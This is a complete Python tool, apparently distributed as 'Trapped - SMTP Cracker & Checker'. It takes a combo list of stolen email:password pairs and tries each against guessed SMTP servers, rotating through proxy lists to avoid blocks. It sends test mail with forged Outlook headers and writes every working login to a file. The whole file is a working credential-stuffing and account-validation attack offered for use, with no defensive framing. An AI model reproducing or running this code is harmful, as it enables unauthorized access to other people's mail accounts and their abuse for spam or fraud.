import tkinter as tk
from tkinter import ttk
from tkinter import messagebox, filedialog
import time
import smtplib, re,os
import socks
from email.mime.text import MIMEText
import concurrent.futures
import colorama
from colorama import Fore
colorama.init(autoreset=True)

yl=Fore.YELLOW
bl=Fore.BLUE
rd=Fore.RED
grn=Fore.GREEN
wht=Fore.WHITE
try:
	os.system('title Trapped - SMTP Cracker and Checker @t3trap')
except:pass
class EmailSender:
	SMTP_PORTS = [587, 465]

	SUBDOMAINS = ["", "smtp.", "mail.", "webmail."]

	def __init__(self, sender_email, receiver_email, email_password, smtp_server="", smtp_port=0,
		proxy = '', timeout=10):
		self.sender_email = sender_email
		self.receiver_email = receiver_email
		self.email_password = email_password
		self.smtp_server = smtp_server
		self.smtp_port = smtp_port
		self.timeout = timeout
		self.proxy = proxy

	def setup_socks_proxy(self):
		if self.proxy and Enable_proxy:
			if self.proxy['type']=='http':
				socks.set_default_proxy(socks.PROXY_TYPE_HTTP, self.proxy['address'], self.proxy['port'])
			elif self.proxy['type']=='https':
				socks.set_default_proxy(socks.PROXY_TYPE_HTTPS, self.proxy['address'], self.proxy['port'])
			elif self.proxy['type']=='socks4':
				socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, self.proxy['address'], self.proxy['port'])
			elif self.proxy['type']=='socks5':
				socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, self.proxy['address'], self.proxy['port'])

	def detect_smtp_server(self):
		try:
			domain = self.sender_email.split('@')[1]

			with open('smtp_servers.txt', 'r') as f:
				fsrv = f.read()
				match = re.search(f"({domain}.*)", fsrv, re.IGNORECASE)
				if match:
					self.smtp_server, self.smtp_port = match.group(1).split('|')
					return
			for subdomain in self.SUBDOMAINS:
				for port in self.SMTP_PORTS:
					smtp_server = f"{subdomain}{domain}"

					try:
						if Enable_proxy:
							self.setup_socks_proxy()

						with smtplib.SMTP(smtp_server, port, timeout=self.timeout) as server:
							self.smtp_server = smtp_server
							self.smtp_port = port
							with open('smtp_servers.txt', 'a') as f:
								f.write(f"{self.smtp_server}|{self.smtp_port}\n")
							return
					except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected):
						continue
					except Exception as e:
						print(f"{rd}{self.sender_email} : Failed{wht}")
						open('trapped_error_logs.txt','a').write(f"{self.sender_email} : Error checking SMTP server: {e}\n{wht}")

			print(f"{rd}{self.sender_email} : Failed")
			open('trapped_error_logs.txt','a').write(f"{self.sender_email} : Error: No SMTP server found for {domain}\n{wht}")

		except Exception as e:
			print(f"{rd}{self.sender_email} : Failed")
			open('trapped_error_logs.txt','a').write(f"{self.sender_email} : Error detecting SMTP server: {e}\n{wht}")

	def send_email(self):
		try:
			subject = 'Hello'
			body = 'yea'
			message = MIMEText(body)
			message['Subject'] = subject
			message['From'] = self.sender_email
			message['To'] = receiver_email
			message.add_header('X-Priority2','2')
			message.add_header('X-MSmail-Priority', 'High')
			message.add_header('X-Mailer', 'Microsoft Office Outlook, Build 11.0.5510')
			message.add_header('X-MimeOLE', 'Produced By Microsoft MimeOLE V6.00.2800.1441')
			if self.smtp_server=="" and self.smtp_port==0:
				self.detect_smtp_server()
			else:
				with open('smtp_servers.txt', 'r') as f:
					fsrv = f.read()
					if not self.smtp_server in fsrv:
						open('smtp_servers.txt', 'a').write(f"{self.smtp_server}|{self.smtp_port}\n")
			if self.smtp_server and self.smtp_port:
				if Enable_proxy:
					self.setup_socks_proxy()
				with smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=self.timeout) as server:
					server.starttls()
					server.login(self.sender_email, self.email_password)
					server.sendmail(self.sender_email, self.receiver_email, message.as_string())
				print(f"{grn}{self.sender_email} : Works !{wht}")
				open('Checked.txt','a').write(f"{self.smtp_server}|{self.smtp_port}|{self.sender_email}|{self.email_password}\n")
			else:
				print(f"{rd}{self.sender_email} : Failed")
				open('trapped_error_logs.txt','a').write(f"{self.sender_email} : Unable to detect SMTP server.\n{wht}")
		except smtplib.SMTPAuthenticationError:
			print(f"{rd}{self.sender_email} : Failed")
			open('trapped_error_logs.txt','a').write(f"{self.sender_email} : SMTP authentication failed.\n{wht}")
		except smtplib.SMTPException as e:
			print(f"{rd}{self.sender_email} : Failed")
			open('trapped_error_logs.txt','a').write(f"{self.sender_email} : {e}\n{wht}")

def send_email_wrapper(args):
	global Prx_cont,proxy_info,Proxy_type,Enable_proxy
	if Proxy_type=="Proxyless":
		Enable_proxy=False
	else:
		Enable_proxy=True
	sender_email, receiver_email, email_password,smtpserv,smtport = args
	if Proxy_type!="Proxyless" and len(prxs)>1:
		Proxy_type=Proxy_type.replace('Proxyless','').replace('HTTP','http').replace('HTTP/HTTPS','https').replace('SOCKS4','socks4').replace('SOCKS5','socks5')
		proxy_ip,proxy_port=prxs[Prx_cont].split(':')
		proxy_info = {'type': Proxy_type, 'address': proxy_ip, 'port': proxy_port}
	else:
		proxy_info = {'type': Proxy_type, 'address': 'proxy_ip', 'port': 'proxy_port'}
	sender = EmailSender(sender_email, receiver_email, email_password,smtpserv,smtport, proxy=proxy_info)
	sender.send_email()

if __name__ == "__main__":
	if not os.path.isfile('myemail.txt'):
		open('myemail.txt','w').write('')
	if not os.path.isfile('smtp_servers.txt'):
		open('smtp_servers.txt','w').write('')
	
	hel=f"""
{yl}Trapped {wht}-{yl} SMTP Cracker & Checker
{yl}被困 {wht}-{yl} SMTP 破解器和檢查器

{grn}Version : {wht}1.0
{bl}Dev: {wht}Shaman 薩滿

{yl}
More Tools : 
{bl}Telegram : https://t.me/t3trap

"""
	print(hel)
	Enable_proxy=False
	Prx_cont=0
	Proxy_type="Proxyless"

	choice=""
	root = tk.Tk()
	root.title("Trapped - SMTP Scanner - @t3trap")
	root.geometry("300x300")
	root.resizable(False,False)

	def opencmb():	
		global combs
		while True:
			file_path = filedialog.askopenfilename(title="Select file of combo list",filetypes=[("Text files", "*.txt"), ("All Files", "*.*")])
			if not file_path:
				ques = messagebox.askyesno(message="You need to select a text file. Would you like to try again?",icon='question' ,title='Trapped - @t3trap')
				if not ques:
					break
			else:
				with open(file_path, 'r') as f:
					combs = f.read().strip().splitlines()
				break

	def openprx():	
		global prxs
		while True:
			if Proxy_type=="Proxyless":
				prxs=[]
				break
			file_path = filedialog.askopenfilename(title="Select file of proxy list",filetypes=[("Text files", "*.txt"), ("All Files", "*.*")])
			if not file_path:
				ques = messagebox.askyesno(message="You need to select a text file. Would you like to try again?",icon='question' ,title='Trapped - @t3trap')
				if not ques:
					break
			else:
				with open(file_path, 'r') as f:
					prxs = f.read().strip().splitlines()
				break

	def save_me():
		with open('myemail.txt', 'w') as f:
			f.write(entry1.get())
		time.sleep(0.2)
		root.destroy()

	def on_optionprx_change(*args):
		global Enable_proxy,Proxy_type
		Proxy_type = varprox.get()
		if Proxy_type=="Proxyless":
			Enable_proxy=False
		else:
			Enable_proxy=True
		openprx()

	def on_option_change(*args):
		global choice
		selected_value = var.get()
		choice = options_dict[selected_value]
		opencmb()

	label1 = tk.Label(root, text="Your E-mail", fg="#FFFFFF", bg="#333333")
	label1.grid(row=0, column=0, padx=5, pady=5, sticky="w")
	entry1 = tk.Entry(root, width=30)
	entry1.grid(row=1, column=0, padx=5, pady=10, sticky="w")
	with open('myemail.txt', 'r') as f:
		entry1.insert(0, f.read().strip())
	label1 = tk.Label(root, text="Select:", fg="#FFFFFF", bg="#333333")
	label1.grid(row=2, column=0, padx=5, pady=10, sticky="w")
	options_dict = {
		"---Select option---": "0",
		"Check from combo list": "chkmb",
		"Recheck my smtp logins": "rckch"
	}
	var = tk.StringVar(root)
	var.set(list(options_dict.keys())[0])
	option_menu = tk.OptionMenu(root, var, *options_dict.keys(), command=on_option_change)
	option_menu.grid(row=2, column=0, padx=100, pady=5, sticky="w")
	def update_option_var(*args):
		if var.get() == "---Select option---":
			save_button['state'] = tk.DISABLED
		else:
			save_button['state'] = tk.NORMAL
	var.trace_add("write", update_option_var)
	label1 = tk.Label(root, text="Proxy", fg="#FFFFFF", bg="#333333")
	label1.grid(row=4, column=0, padx=5, pady=10, sticky="w")
	proxoptions = ["Proxyless", "HTTP", "HTTP/HTTPS", "SOCKS4", "SOCKS5"]
	varprox = tk.StringVar(root)
	varprox.set(proxoptions[0]) 
	proxoption_menu = tk.OptionMenu(root, varprox, *proxoptions, command=on_optionprx_change)
	proxoption_menu.grid(row=4, column=0, padx=100, pady=15, sticky="w")
	save_button = tk.Button(root, text="Save", command=save_me, fg="#FFFFFF", bg="#333333", state=tk.DISABLED)
	save_button.grid(row=5, column=0, padx=5, pady=1, sticky="w")
	root.mainloop()
	receiver_email = open('myemail.txt','r').read().strip()
	# Exit gui

	time.sleep(2)
	emails=[]
	if choice=='chkmb':
		for smb in combs:
			try:
				smtst = smb.split(':') 
				sender_email = smtst[0]
				email_password = smtst[1]
				smtpserv = ""
				smtport = 0 
				emails.append((sender_email, receiver_email, email_password,smtpserv,smtport))
			except KeyboardInterrupt:
				exit(f"bye.{wht}")
			except Exception as e:
				print(f"{rd}Error parsing combo: {e}{wht}")
	elif choice=='rckch':
		for smb in combs:
			try:
				if smb.count('|') in [3,4]:
					smb = smb.replace(',', "|").replace(':', "|")
					smtst = smb.split('|') if "|" in smb else ""
					smtpserv = smtst[0] 
					smtport = smtst[1]  
					sender_email = smtst[2]
					email_password = smtst[3]
					emails.append((sender_email, receiver_email, email_password,smtpserv,smtport))
				else:
					print(f"{rd} Ignored , wrong format.")
			except KeyboardInterrupt:
				exit(f"bye.{wht}")
			except Exception as e:
				print(f"{rd}Error parsing combo: {e}{wht}")
	else:
		exit(f"bye.{wht}")
	with concurrent.futures.ThreadPoolExecutor() as executor:
		executor.map(send_email_wrapper, emails)
